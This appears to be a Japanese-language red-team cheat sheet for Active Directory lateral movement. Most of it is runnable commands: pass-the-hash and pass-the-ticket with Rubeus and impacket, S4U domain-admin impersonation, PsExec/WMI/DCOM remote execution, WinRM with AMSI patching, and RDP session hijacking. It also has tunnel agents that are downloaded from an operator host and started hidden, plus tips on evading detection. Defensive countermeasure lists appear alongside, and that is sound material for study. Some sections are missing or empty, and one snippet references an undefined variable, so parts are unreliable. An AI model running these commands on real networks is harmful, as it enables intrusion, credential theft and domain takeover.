WinRM が NT hash で通らないのは既定で Negotiate → Kerberos 優先が効くため。Kerberos-only 環境では NT hash から OverPTH で TGT を作ってから初めて WinRM が通る。RDP の Restricted Admin は target 側 registry の設定に依存(s05)。

NT hash → TGT (OverPTH の準備)

powershell
# Rubeus で TGT を取得。/nowrap は Base64 の 76 桁改行を抑止して copy 用に整形
Rubeus.exe asktgt /user:<USER> /rc4:<NT> /domain:<DOMAIN> /nowrap

# AES256 が取れているなら rc4 より Kerberoast 検知に引っかかりにくい
Rubeus.exe asktgt /user:<USER> /aes256:<AES> /domain:<DOMAIN> /nowrap

# /ptt で現在の LUID に注入(=以降のプロセスで Kerberos が使える)
Rubeus.exe asktgt /user:<USER> /rc4:<NT> /domain:<DOMAIN> /ptt

TGT → TGS (service ticket 要求)

powershell
# 事前に TGT を PTT 済みの前提
Rubeus.exe asktgs /service:cifs/<TARGET_FQDN> /nowrap
Rubeus.exe asktgs /service:http/<TARGET_FQDN> /nowrap    # WinRM 用
Rubeus.exe asktgs /service:mssqlsvc/<TARGET_FQDN>:1433 /nowrap

# TGT を直接指定して TGS 発行 (LUID 注入なし、file 出力)
Rubeus.exe asktgs /service:cifs/<TARGET_FQDN> /ticket:<TGT_B64> /outfile:tgs.kirbi

Pass-the-Ticket (PTT — ticket 注入)

powershell
# ファイルからそのまま注入
Rubeus.exe ptt /ticket:tgt.kirbi

# Base64 文字列から直接注入
Rubeus.exe ptt /ticket:<B64>

# 特定の LUID に注入 (別ユーザ context に載せる、要 SeTcbPrivilege 相当)
Rubeus.exe ptt /ticket:<B64> /luid:<LUID_HEX>

# 新しい netonly プロセスに注入 (現 LUID を汚染しない、最も安全)
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
#   -> 出力される LUID を控えて
Rubeus.exe ptt /ticket:<B64> /luid:<NEW_LUID>

# 現行 session の TGT を抽出 (delegation なし、要昇格)
Rubeus.exe tgtdeleg /nowrap
notecreatenetonly は S4U2Self 要らずで別 identity の netonly プロセスを作れる。/show で得た LUID に PTT すれば、その cmd.exe から出る Kerberos 通信のみが偽装 identity になり、operator 側の現行 session は汚さない。ラボと engagement のどちらでも第一選択にすべき pattern。

Linux 側の ticket 取り扱い (ccache)

bash
# Linux 側で TGT を直接取得 (KDC への KRB_AS_REQ を送る)
impacket-getTGT <DOMAIN>/<USER> -hashes :<NT>
#   -> <USER>.ccache が生成される

# AES256 で取得 (rc4 downgrade を避けたい環境向け)
impacket-getTGT <DOMAIN>/<USER> -aesKey <AES>

# ccache を environment variable として設定 (以降の impacket ツールが自動で読む)
export KRB5CCNAME=<USER>.ccache
klist                                       # 中身を確認

# -k -no-pass で Kerberos 認証。/etc/krb5.conf の realm 設定が必須
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>
impacket-wmiexec -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>
smbclient -k //<TARGET_FQDN>/c$

kirbi ↔ ccache 相互変換

bash
# Windows で取った .kirbi を Linux の ccache に変換
impacket-ticketConverter <INPUT>.kirbi <OUTPUT>.ccache

# 逆方向 (Linux 側で使っている ccache を Windows 側で PTT したい)
impacket-ticketConverter <INPUT>.ccache <OUTPUT>.kirbi

# 中身の確認 (SPN / 有効期限 / 暗号種別)
impacket-describeTicket <INPUT>.ccache
防御 / countermeasures
  • Protected Users group: RC4 と NTLM を無効化、TGT 寿命 4h、Kerberos delegation 対象外。lateral 用の high-value account を必ず入れる。
  • AES-only Kerberos: GPO で Network security: Configure encryption types allowed for Kerberos から RC4 を外す。rc4 asktgt が失敗するようになり overpass-the-hash が塞がる。
  • 4648 (explicit credential logon) を全 DC / member で有効化。createnetonly と runas /netonly の trace として恒久有効。
  • TGT lifetime を短縮 (既定 10h → 4h) で盗まれた ticket の消費期限を縮める。domain policy の Kerberos Policy から。
要点 / key takeaways
  • lateral の第一質問は「どの credential format を持っているか」。format が決まれば transport の選択肢が自動で絞られる。
  • createnetonly + PTT は operator の現行 LUID を汚染しない、事故率が最も低い注入パターン。
  • Linux 側から Kerberos 認証するときは KRB5CCNAME + -k -no-pass。/etc/krb5.conf の realm と FQDN が必須。

02SMB-based ExecutionSMB 経由の実行

SMB (445/tcp) は最も歴史があり、最も監視されている lateral 経路。同じ SMB でも 実行トリガの違い(Service Create / Task Scheduler / SMBExec) で残る痕跡が変わる。framework 経由は command-control s10、こちらは impacket / native binary の raw primitive に絞る。

Service-create pattern (PsExec / impacket-psexec)

bash
# impacket 版 (Linux から): SVCCTL 経由で service create → cmd をトリガ
impacket-psexec <DOMAIN>/<USER>@<TARGET> -hashes :<NT>
impacket-psexec <DOMAIN>/<USER>@<TARGET> -k -no-pass       # Kerberos

# service 名を明示 (default は 8 文字 random で bloodhound 検知される)
impacket-psexec <DOMAIN>/<USER>@<TARGET> -hashes :<NT> -service-name BthAvctpSvc

# nxc (旧 CrackMapExec) — 反復オペレーションはこちらが速い
nxc smb <TARGET> -u <USER> -H <NT> -x 'whoami /all'
nxc smb <TARGET> -u <USER> -H <NT> -X '<PS_CMD>'    # PowerShell 実行

# PsExec native binary (Windows→Windows)
PsExec.exe -accepteula \\<TARGET> -u <DOMAIN>\<USER> -p <PW> -s cmd.exe

# SCM 直叩き (痕跡最小化: service を明示制御)
sc.exe \\<TARGET> create BthAvctpSvc binPath= "cmd.exe /c <CMD>" start= demand
sc.exe \\<TARGET> start BthAvctpSvc
sc.exe \\<TARGET> delete BthAvctpSvc

Task Scheduler pattern (atexec / schtasks)

bash
# impacket-atexec — ATSVC 経由。EID 7045 は残らない
impacket-atexec <DOMAIN>/<USER>@<TARGET> -hashes :<NT> 'whoami'

# native schtasks (Windows→Windows)
schtasks /create /s <TARGET> /tn "Update" /tr "cmd /c <CMD>" /sc ONCE /st 00:00 /ru SYSTEM
schtasks /run /s <TARGET> /tn "Update"
schtasks /delete /s <TARGET> /tn "Update" /f

SMBExec (semi-interactive shell)

bash
# psexec と違い binary drop なし、service を一時作成して cmd の出力を SMB 共有経由で回収
impacket-smbexec <DOMAIN>/<USER>@<TARGET> -hashes :<NT>

# service 名を default (BTOBTO) から変更
impacket-smbexec <DOMAIN>/<USER>@<TARGET> -hashes :<NT> -service-name UpdaterSvc

防御 / countermeasures
  • SMB signing required を全 member に強制 (GPO: Microsoft network server: Digitally sign communications (always))。NTLM Relay の完封に効く。
  • EID 7045 (new service install) を SIEM で必ず拾う。特に binPath が cmd.exe /c や 8 文字 random 名の service 名は高精度で impacket-psexec を検知。
  • EID 5145 (detailed file share access) で \\*\ADMIN$ と \\*\C$ の access を audit。SMBExec の \\*\C$\Windows\Temp\ への write もここに現れる。
  • SeImpersonatePrivilege を持つ user を減らす。SeImpersonate があると service 経由の子プロセスから SYSTEM への便乗が容易 (evasion s02 参照)。
要点 / key takeaways
  • impacket-psexec は最も便利だが最も検知される。service 名を default random から変えるだけで EID 7045 の signature 検知率が下がる。
  • AtExec は EID 7045 を残さないので blue team の default rule を素通りしやすい。ただし EID 4698 (Scheduled Task created) は残る。
  • SMBExec は binary drop なしで stealth に見えるが、SMB 共有への読み書きが激しく EID 5145 で目立つ。

03RPC / DCOM ExecutionRPC / DCOM 経由の実行

Service を作らずに DCOM object の method 呼び出しで任意コマンドを起動する。EID 7045 が残らないため service-create 検知を素通りする一方、Sysmon の parent-child anomaly (mmc.exe → cmd.exe 等) には引っかかる。

WMI Win32_Process.Create

bash
# impacket-wmiexec — RPC/DCOM (135/tcp + dynamic) 経由。SMB session なしでも動く
impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes :<NT>

# silent 一発 (semi-interactive shell を張らず単発コマンド)
impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes :<NT> 'whoami /priv'

# nxc の wmi module (wmiexec + smbexec の代替)
nxc wmi <TARGET> -u <USER> -H <NT> -x '<CMD>'
powershell
# Windows native — wmic (deprecated だが多くの環境に残る)
wmic /node:<TARGET> /user:<DOMAIN>\<USER> /password:<PW> process call create "cmd.exe /c <CMD>"

# PowerShell の Invoke-WmiMethod (DCOM transport)
$cred = Get-Credential
Invoke-WmiMethod -ComputerName <TARGET> -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c <CMD>' -Credential $cred

# Invoke-CimMethod (WSMan transport、WinRM 前提)
$s = New-CimSession -ComputerName <TARGET> -Credential $cred
Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='<CMD>'}

# impacket-dcomexec — MMC20 / ShellWindows / ShellBrowserWindow を選べる

impacket-dcomexec -object shellwindows <DOMAIN>/<USER>@<TARGET> -hashes :<NT>
impacket-dcomexec -object shellbrowserwindow <DOMAIN>/<USER>@<TARGET> -hashes :<NT>

# MMC20.Application を PowerShell から直接叩く

$obj = [Activator]::CreateInstance($com)
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c <CMD>", "7")

$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c <CMD>", "C:\Windows\System32", $null, 0)
noteDCOM object 経由の実行は子プロセスの親が特殊になる。MMC20 なら mmc.exe、ShellWindows なら explorer.exe や dllhost.exe {GUID}、WMI なら wmiprvse.exe。この parent-child 関係が blue team の主要 signature になっているため、DCOM object を選ぶときは「target で自然に動いていそうな親プロセス」を優先する(Excel が入っている環境なら Excel.Application 経由の DDE、admin workstation なら MMC20)。
防御 / countermeasures
  • Sysmon EID 1 で parent=wmiprvse.exe|mmc.exe|dllhost.exe|explorer.exe かつ child=cmd.exe|powershell.exe の rule を貼る。
  • Microsoft-Windows-WMI-Activity/Operational EID 5857 / 5858 / 5859 / 5861 — WMI ProviderStore の異常呼び出し、特に __EventFilter や __EventConsumer の作成は WMI Persistence の signature。
  • DCOM を用途別に制限: dcomcnfg または GPO の DCOM: Machine Access Restrictions で MMC20 の remote launch を無効化。互換性影響が大きいので pilot 環境で先に検証。
  • WMI namespace ACL: root\cimv2 の __ProviderRegistration の SD を強化して Win32_Process.Create の remote 実行を Domain Admins のみに絞る。
要点 / key takeaways
  • DCOM は「service を作らない」ので EID 7045 検知を素通りするが、Sysmon EID 1 の parent 検査で捕まる。
  • WMI (Win32_Process.Create) と DCOM (MMC20/ShellWindows) は親プロセスが違う。同じ「WMI」でも Invoke-WmiMethod は DCOM、Invoke-CimMethod は WSMan と transport が違う。
  • 単発コマンドは impacket-wmiexec <args> '<CMD>' の semi-interactive を張らない形が最も痕跡が少ない。

04WinRM / PowerShell RemotingWinRM / PS リモーティング

WinRM は 5985 (HTTP) / 5986 (HTTPS) の SOAP over WSMan。Kerberos が優先されるため NT hash 単体では通らない — s01 の OverPTH で TGT を作ってから使う。framework 経由は command-control s10 の jump-winrm、こちらは native の PSSession / evil-winrm。

evil-winrm

bash
# NTLM (Negotiate) 経由 — target の WinRM が NTLM を許可している場合のみ
evil-winrm -i <TARGET> -u <USER> -H <NT>
evil-winrm -i <TARGET> -u <USER> -p <PW>

# HTTPS (5986) — self-signed 証明書対応
evil-winrm -i <TARGET> -u <USER> -p <PW> -S

# Kerberos — 事前に KRB5CCNAME=<ccache> が必要、/etc/krb5.conf の realm 設定必須
evil-winrm -i <TARGET_FQDN> -r <DOMAIN>

# ローカルスクリプト menu (Bypass-4MSI, Invoke-Binary, upload/download)
# evil-winrm shell の中で:
#   menu           -> 内蔵コマンド一覧
#   upload <src> <dst>
#   Bypass-4MSI    -> AMSI patch
#   Invoke-Binary <path>  -> assembly の in-memory 実行

PowerShell Remoting (Enter-PSSession / Invoke-Command)

powershell
# 対話 session (単一 host)
$cred = Get-Credential
Enter-PSSession -ComputerName <TARGET> -Credential $cred

# scriptblock を一発実行
Invoke-Command -ComputerName <TARGET> -Credential $cred -ScriptBlock { whoami; hostname }

# 複数 host に並列で同じ ScriptBlock を撃つ
Invoke-Command -ComputerName @('<T1>','<T2>','<T3>') -Credential $cred -ScriptBlock { $env:COMPUTERNAME }

# session を張って再利用 (帯域と handshake を節約)
$s = New-PSSession -ComputerName <TARGET> -Credential $cred
Invoke-Command -Session $s -ScriptBlock { Get-Process }
Invoke-Command -Session $s -ScriptBlock { Get-Service }
Remove-PSSession $s

# -Authentication Kerberos / Negotiate / CredSSP の切り替え
Invoke-Command -ComputerName <TARGET_FQDN> -Authentication Kerberos -Credential $cred -ScriptBlock { whoami }

# WSMan の TrustedHosts 設定 (workgroup で NTLM を通したい)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "<TARGET>" -Force

nxc winrm module

bash
# NT hash spray (workgroup / non-domain で有効)
nxc winrm <CIDR> -u <USER> -H <NT>

# 認証 OK な host に対して単発コマンド
nxc winrm <TARGET> -u <USER> -H <NT> -x 'whoami /priv'

# AMSI bypass 込みで PowerShell を実行 (nxc の -X)

JEA / CLM 制約下

Just Enough Administration (JEA) 適用の session や Constrained Language Mode (CLM) 有効の Remoting endpoint では通常の .NET 呼び出しが弾かれる。実質許可コマンドの列挙:

powershell
# CLM かどうかを確認
$ExecutionContext.SessionState.LanguageMode
# FullLanguage / ConstrainedLanguage / RestrictedLanguage

# JEA endpoint で「使える cmdlet」を列挙
Get-Command | Where-Object { $_.Visibility -eq 'Public' }

# CLM bypass は evasion sheet の CLM Bypass 節に本文がある — 実際の bypass 手順はそちら参照

詳細な CLM bypass 手順は evasion s02 を参照。ここでは「WinRM 経由の session が CLM だと通常の PTT / assembly load が失敗する」という制約の認識に留める。

防御 / countermeasures
  • WinRM を Kerberos-only 化: winrm set winrm/config/service '@{AllowUnencrypted="false";Auth="@{Basic="false";Kerberos="true";Negotiate="false";Certificate="false";CredSSP="false"}"}'。NTLM を落とすと NT hash 単体の WinRM 直接注入を塞げる。
  • JEA (Just Enough Administration): 管理用アカウントの WinRM endpoint を特定 role capability に絞る。New-PSRoleCapabilityFile と New-PSSessionConfigurationFile -SessionType RestrictedRemoteServer。
  • Microsoft-Windows-WinRM/Operational EID 91, 142 — session create / connect の event を SIEM に送る。
  • PowerShell logging: Module Logging + Script Block Logging を GPO で強制。Microsoft-Windows-PowerShell/Operational EID 4104 は Invoke-Command 経由でも target 側に残る。
要点 / key takeaways
  • WinRM の第一問は「NTLM 許可か Kerberos-only か」。Kerberos-only なら NT hash のまま WinRM は通らず、必ず s01 の OverPTH で TGT を作る必要がある。
  • New-PSSession → Invoke-Command -Session の再利用パターンは、handshake の trace を減らせる。特に複数コマンドを叩くときに有効。
  • JEA / CLM の endpoint は「PowerShell の見た目をしていても実質別 shell」。従来手法が通らないので、まず LanguageMode と Get-Command の visibility を確認。

05RDP LateralRDP による横展開

Interactive lateral の代表。Restricted Admin mode を使うと NT hash のまま RDP が通り、Session Hijack を使うと SYSTEM 権限で他ユーザの生 session を奪える。

通常の interactive RDP

bash
# Kali 側から (freerdp3-x11)
xfreerdp3 /u:<USER> /d:<DOMAIN> /p:<PW> /v:<TARGET> +clipboard /size:1600x1000

# ドライブ共有 (Kali の /tmp を RDP 経由でマウント)
xfreerdp3 /u:<USER> /p:<PW> /v:<TARGET> /drive:share,/tmp

# 証明書エラー無視 (self-signed の内部 CA 環境)
xfreerdp3 /u:<USER> /p:<PW> /v:<TARGET> /cert:ignore

Restricted Admin (Pass-the-Hash via RDP)

NT hash のまま RDP を通すには target 側 registry の DisableRestrictedAdmin = 0 が必要。default で無効な環境が多いため、事前に有効化しておく必要がある(=target 側で先に SMB 経由の command 実行が必要 → 鶏卵問題)。

powershell
# target 側で Restricted Admin を許可 (要 admin)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# nxc smb 経由で先に registry を書いておく
nxc smb <TARGET> -u <USER> -H <NT> -x 'reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'
bash
# Kali から NT hash で RDP
xfreerdp3 /u:<USER> /d:<DOMAIN> /pth:<NT> /v:<TARGET> /cert:ignore /size:1600x1000

RDP Session Hijack (tscon)

SYSTEM 権限で tscon を呼ぶと、認証なしで他ユーザの生 session を自 session に接続できる。password / hash 不要で、他ユーザのすでに開いた authenticated session をそのまま乗っ取れる。

powershell
# 現在の session 一覧 (target 上で)
query user
#   USERNAME  SESSIONNAME  ID  STATE   IDLE TIME  LOGON TIME
#   alice     rdp-tcp#3    2   Disc    12:45      2026-07-10 09:00
#   bob                    3   Active  .          2026-07-11 08:12

# admin から直接 tscon は認証を要求される → SYSTEM に昇格が必要

# SYSTEM 昇格の常套手段: service 経由で tscon を呼ぶ
sc create sesshijack binPath= "cmd.exe /k tscon 2 /dest:rdp-tcp#4"
sc start sesshijack
#   -> session ID 2 (alice) が自 session (#4) に接続される、password 不要

# PsExec 経由の SYSTEM 昇格でも同じ
PsExec.exe -accepteula -s -i cmd.exe
#   -> SYSTEM shell 内で tscon 2 /dest:rdp-tcp#4
noteRDP Session Hijack は password / hash なしで DA session を奪取できる強力な pattern。Server 上で DA が RDP 接続したまま disconnect (log off せずに切断) している状況で成立する。Terminal Server / Session Host / Jump Box を経由する運用の組織で特に効く。
防御 / countermeasures
  • Restricted Admin を default 無効のまま維持。有効化する場合は Server-side でも Client-side でも同時管理し、GPO で監視。
  • Session Hijack 対策: GPO の Set time limit for disconnected sessions を 1〜5 分に設定して disconnected session を強制 logoff。
  • EID 4778 / 4779(session reconnect / disconnect)を SIEM で拾う。特に Session Name と Client Name の乖離は hijack signature。
  • Remote Credential Guard を使えば RDP 先で credential が LSASS に載らない — hijack しても後段の credential dumping が空振り。
  • Privileged Access Workstation (PAW): DA が触る Jump Box は SYSTEM 権限に到達できる local admin を最小限に絞る。
要点 / key takeaways
  • Restricted Admin は「NT hash で RDP が通る」ので便利だが、target 側 registry の事前設定が必要。事前設定に SMB 経由の command 実行を挟むので、そもそも SMB が通るなら RDP を使わない選択肢もある。
  • RDP Session Hijack は SYSTEM さえ取れれば認証情報ゼロで DA を奪える。Jump Box / Terminal Server 系の環境で最優先で試す。
  • 4624 type 10 (RemoteInteractive) と 4779 (session disconnect) の pairing が blue team の主要 signature。

06Kerberos-abuse as Lateral TransportKerberos の lateral 用途

Kerberos exploit 本体の理論と取得手順は ad-compromise s2(Credential Access)。ここでは取得済み ticket を lateral の transport として使う手順に絞るが、実務での再現性を優先して OverPTH / PTT / S4U の完結手順を本 sheet 内でも詳細に載せる。

OverPTH (Overpass-the-Hash) 完結手順

NT hash / AES key から TGT を作り、以降の全 Kerberos service (SMB / WinRM / RDP / MSSQL / LDAP) に対して認証できる状態を作る。NTLM が禁止された環境で NT hash から lateral するときの第一手。

S4U (Constrained Delegation) 経由の lateral

Constrained Delegation を許可された service account の credential を持っているとき、任意ユーザ (DA 含む) の TGS を発行して lateral できる。ad-compromise s2 の delegation 節が本文だが、lateral 経路として使う 手順を完結させておく。

powershell

# [2] その account (例: svc_web$, delegated to cifs/<TARGET>) の hash / AES があると仮定

# [3] S4U で任意ユーザの TGS を発行 (DA を impersonate、TARGET の SMB 用)
Rubeus.exe s4u /user:svc_web$ /rc4:<NT> /impersonateuser:<DA_USER> /msdsspn:cifs/<TARGET_FQDN> /ptt

# [4] 以降 <TARGET> の SMB が DA 権限で通る
dir \\<TARGET_FQDN>\c$

# [5] altservice trick — msds-spn に指定した SPN を LDAP / HOST 等に読み替え
#     (Kerberos は SPN の service class 部分だけを見るので複数用途に転用可能)
Rubeus.exe s4u /user:svc_web$ /rc4:<NT> /impersonateuser:<DA_USER> /msdsspn:cifs/<TARGET_FQDN> /altservice:host,http,ldap /ptt

# [6] Linux 側 (impacket-getST)
impacket-getST -spn cifs/<TARGET_FQDN> -impersonate <DA_USER> <DOMAIN>/svc_web\$ -hashes :<NT>
export KRB5CCNAME=<DA_USER>@cifs_<TARGET_FQDN>@<DOMAIN>.ccache
impacket-psexec -k -no-pass <DOMAIN>/<DA_USER>@<TARGET_FQDN>

自分が動いている session の中で、他ホストに forward できる delegate TGT を抜き取る。Unconstrained Delegation を持つ host に coerce authentication (PetitPotam / SpoolSample) を仕掛けた後の credential 収集にも同じ機能。

powershell

#   -> B64 出力される、これを PTT すれば別 session で同じ identity で振る舞える

# 続けて他ホストに PTT で持ち込む
Rubeus.exe ptt /ticket:<B64>
防御 / countermeasures
  • Constrained Delegation は Kerberos-only 化 (Use Kerberos only) にして、任意 protocol transition の delegation を禁止する。RBCD 側の許可管理も同時に。
  • EID 4769(Kerberos service ticket request)を全 DC で有効化、特に Ticket Options: 0x40810000 (forwardable + renewable + preauth) と、S4U proxy request signature (Options 0x8) を SIEM で拾う。
  • EID 4624 type 3 with LogonProcessName=Kerberos の source workstation が「本来ログインしないユーザからのアクセス」パターンを検出。
  • Protected Users と Account is sensitive and cannot be delegated を DA / high-value account に必ず設定。Delegation の対象から外れ、Golden / S4U 全般が塞がる。
要点 / key takeaways
  • OverPTH は「NTLM 禁止 & NT hash 所持」の交点で必ず必要。SMB signing / WinRM Kerberos-only 環境で第一手。
  • PTT は createnetonly + /luid の組み合わせで operator 側の LUID を汚さない運用が基本。事故 (mimikatz の list で ticket が見える) を防げる。
  • S4U は /altservice で SPN を横展開できる — 一度取れば cifs / host / http / ldap を全部使える。
  • EID 4769 と 4624 の pair は最も強力な blue team signature。lateral の頻度を落として rate anomaly に埋もれない運用を意識する。

要点 / key takeaways
  • SQL Server は「credential dumping 対象ではないが shell を出せる」ため、EDR の視野の外で lateral できることが多い。
  • Linked server chain は BloodHound の attack path に載らない — 手動で sys.servers を毎 instance で確認するか、PowerUpSQL の crawl を使う。
  • xp_cmdshell が塞がれていても sp_OACreate / CLR assembly load で代替可能。CLR は sp_configure すら不要のパターンもある。

08Non-domain / Workgroup Lateral非ドメイン環境の横展開

AD が無い、または member でない host 群での lateral。Kerberos は使えず、NTLM 100% + UAC Remote Restriction の壁がある。DMZ / OT / legacy 環境 / M&A 直後のセグメントで頻出。

UAC Remote Restriction の解説

非-domain の Local Admin account (Administrator を除く) は既定で remote 経由でのみ token filtering される。SMB / WinRM / RPC でリモート接続すると full admin token が medium integrity に downgrade され、Admin$/C$ への write や service create が失敗する。回避には target 側 registry で LocalAccountTokenFilterPolicy = 1 を仕込む必要がある。

powershell
# target 側で LocalAccountTokenFilterPolicy を有効化
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

# 反映 (再起動不要)
# -> 以降、Local Admin group の任意メンバが remote で full admin token を持てる

ただし「そもそも仕込むには先に target で command 実行が必要」= 鶏卵問題。実務では以下の順で試す:

  1. built-in Administrator account の hash があるか(これだけは UAC filtering を回避)
  2. Administrator ではない Local Admin なら、SMB での ADMIN$ write が通るか事前確認
  3. psexec の Named Pipe 経由 (impacket-psexec) は UAC filtering の影響を受けにくい

Local Admin hash reuse (spray)

bash
# /24 全体に built-in Administrator の NT hash を spray (--local-auth 必須)
nxc smb <CIDR> -u Administrator -H <NT> --local-auth
nxc smb <CIDR> -u Administrator -H <NT> --local-auth -x 'hostname'

# PsExec 系 (--local-auth 相当は impacket-psexec なら自動判定)
impacket-psexec Administrator@<TARGET> -hashes :<NT>

# LAPS 環境の check (nxc の laps module)
nxc ldap <DC> -u <USER> -p <PW> --laps
nxc smb <CIDR> -u <USER> -p <PW> -M laps
noteLAPS が導入されている環境では local admin password が host ごとに一意 (かつ ADSI 上の ms-Mcs-AdmPwd 属性に平文保存)。hash reuse は成立しないが、AD 読み取りができれば LAPS 平文を直接引ける。Windows LAPS (2023 以降) は暗号化保存に変わっているので条件が違う。

Workgroup 環境での WinRM

powershell

# 接続 (Local Admin credential)

# target 側で WinRM を有効化 (Server 版は default 有効、Client 版は要 winrm quickconfig)
#   -> Client 版は事前に WinRM が動いていないので、SMB で先に有効化コマンドを撃つ必要あり:
#      nxc smb <TARGET> -u Administrator -H <NT> --local-auth -x 'winrm quickconfig -q'
防御 / countermeasures
  • built-in Administrator を無効化、または rename + 20 文字以上 random password + 定期変更 (LAPS 適用対象に含める)。
  • LAPS を全 workstation / member server に適用: local admin password の site-wide reuse を根絶。
  • UAC Remote Restriction をそのまま維持: LocalAccountTokenFilterPolicy を 0 のまま。運用で必要な場合は GPO で管理下に置き、変更を SIEM で監視。
  • Network Level Authentication (NLA) を強制 (RDP)、SMB signing を強制。
  • Guest / Domain Users を Local Admin から除外: workgroup 系でも Local Users / Groups を GPO / Local Group Policy で管理。
要点 / key takeaways
  • Non-domain lateral の第一問は「built-in Administrator の hash があるか」。あれば UAC Remote Restriction を素通りできる。
  • Administrator 以外の Local Admin は LocalAccountTokenFilterPolicy=1 の事前仕込みが必要 → 鶏卵問題。
  • LAPS 未導入環境では local admin hash が全 host で共通のケースが多い。/24 spray で高確率で全落ちする。

  • authorized_keys の監視: auditd で ~/.ssh/authorized_keys の write を wa audit ルールに登録。新規 pubkey 追加を SIEM に転送。
  • sudo policy の最小化: NOPASSWD を極力使わず、必要な場合は GTFOBins に載っている binary (find, vim, less, awk, tar, etc.) を対象から除外。
  • WSL の有効化 policy: 業務端末では Microsoft-Windows-Subsystem-Linux と VirtualMachinePlatform の Optional Feature を GPO で無効化。
  • OpenSSH server logs: /var/log/auth.log の Accepted publickey に対して new source IP を alert。
要点 / key takeaways
  • SSH key reuse は Linux 環境の lateral で最も高頻度・低検知の pattern。過去接続履歴 (known_hosts) と authorized_keys の cross-check で lateral graph が浮かぶ。
  • SSH agent hijack は root さえ取れれば認証情報ゼロで next-hop に到達可能。jump host 運用組織で最優先。
  • WSL は「Windows 上で Linux が動く」ため EDR の視野が二層に分かれる。Windows 側の EDR が WSL 内のプロセスを完全に見えていない環境がある。
  • Windows → Linux の逆方向 lateral は OpenSSH client の存在確認から。1809 以降のほぼ全 Windows で ssh.exe が使える。

ligolo-ng: setup と agent 配布

proxy 側 (operator) で TUN device を先に作成、self-cert で listener 起動。agent は TLS で reverse connect back する。v0.7 系は proxy CLI で interface_create --name による dynamic TUN 生成に対応するが、事前に ip tuntap add する古典 pattern が最も安定。

bash
# [operator / kali] TUN device 作成 (root)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# [operator] proxy 起動 (self-signed 証明書、11601/tcp listen)
./proxy -selfcert -laddr 0.0.0.0:11601

# 別 port を使いたい場合
./proxy -selfcert -laddr 0.0.0.0:9001

# verbose log (troubleshoot 時)
./proxy -selfcert -laddr 0.0.0.0:11601 -v

Target 側 (Linux agent):

bash
# operator の HTTP server から配布 (curl / wget)
curl http://<LHOST>:8888/agent -o /tmp/agent
chmod +x /tmp/agent

# 起動 (self-cert 検証を skip)
./tmp/agent -connect <LHOST>:11601 -ignore-cert

# daemon 化 (session 切断後も残す)
nohup /tmp/agent -connect <LHOST>:11601 -ignore-cert &>/dev/null &

Target 側 (Windows agent):

powershell
# PowerShell で配布
iwr http://<LHOST>:8888/agent.exe -o C:\Users\Public\agent.exe

# 起動
C:\Users\Public\agent.exe -connect <LHOST>:11601 -ignore-cert

# hidden window で起動 (SmartScreen / AV は evasion sheet の技法で回避)
Start-Process -WindowStyle Hidden C:\Users\Public\agent.exe "-connect <LHOST>:11601 -ignore-cert"

ligolo-ng: troubleshooting

  • agent が connect back できない: proxy 側 firewall で 11601/tcp が閉じている / TLS 証明書検証エラー (agent 側で -ignore-cert 明示) / DNS 解決失敗 (proxy を FQDN で指定した場合)。まず ./proxy -v で verbose log。
  • route 追加できない (RTNETLINK: Operation not permitted): sudo 忘れ、または既存 route と CIDR 衝突。ip route show で衝突を先に消す。
  • TUN device 作成失敗 (RTNETLINK: File exists): 前回の TUN が残っている。sudo ip link delete ligolo で削除してから再作成。
  • 名前解決失敗 (TUN 越しで FQDN が引けない): 内部 DNS を /etc/resolv.conf に暫定追加、または dig @<INTERNAL_DNS> <FQDN> で直接 query。/etc/hosts に固定 IP を書く手も。
  • tunnel が start しても通信が届かない: agent 側 host の firewall で forwarding が禁止されている可能性。特に Windows Defender Firewall の out ルール。

chisel: SOCKS + forward tunnel

ligolo が使えない (TUN 作成不可、UDP 不要) 場面での軽量代替。HTTPS 制約下や corporate proxy 環境での egress にも強い。

bash
# [operator] server (TLS + reverse mode)
./chisel server -p 8443 --reverse --tls-cert cert.pem --tls-key key.pem

# --- (A) reverse SOCKS (最も基本、pivot 越しに kali の任意 tool を通したい) ---
./chisel client --tls-skip-verify https://<LHOST>:8443 R:1080:socks

# --- (B) reverse forward (単一 service の露出) ---
#   operator の 127.0.0.1:8080 が agent 経由で <INTERNAL_TARGET>:80 に転送
./chisel client --tls-skip-verify https://<LHOST>:8443 R:8080:<INTERNAL_TARGET>:80

# --- (C) multi-mapping (WinRM + MSSQL + HTTP を一発で) ---
./chisel client --tls-skip-verify https://<LHOST>:8443 \
    R:5985:<INTERNAL_TARGET>:5985 \
    R:1433:<INTERNAL_DB>:1433 \
    R:8080:<INTERNAL_HTTP>:80

# --- (D) HTTP proxy 経由 (corporate proxy 環境) ---
./chisel client --proxy http://<USER>:<PW>@<CORP_PROXY>:8080 \
    https://<LHOST>:8443 R:1080:socks

# --- (E) keepalive と reconnect (エンゲージメントを跨いで維持) ---
./chisel client --keepalive 30s --max-retry-count -1 https://<LHOST>:8443 R:1080:socks

# [operator] proxychains 経由で kali tool を通す (SOCKS の場合)
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains4 nmap -sT -Pn -p 80,443,445 <INTERNAL_TARGET>
proxychains4 impacket-secretsdump <DOMAIN>/<USER>@<INTERNAL_TARGET> -hashes :<NT>

SSH tunnel (SOCKS / -L / -R / ProxyJump)

pivot host に SSH アクセスが既にある場合の低検知代替。chisel の binary drop なしで SOCKS / forward / reverse が完結する。

bash
# SOCKS proxy (dynamic port forward)
ssh -D 1080 <USER>@<PIVOT>                       # foreground
ssh -fN -D 1080 <USER>@<PIVOT>                   # background

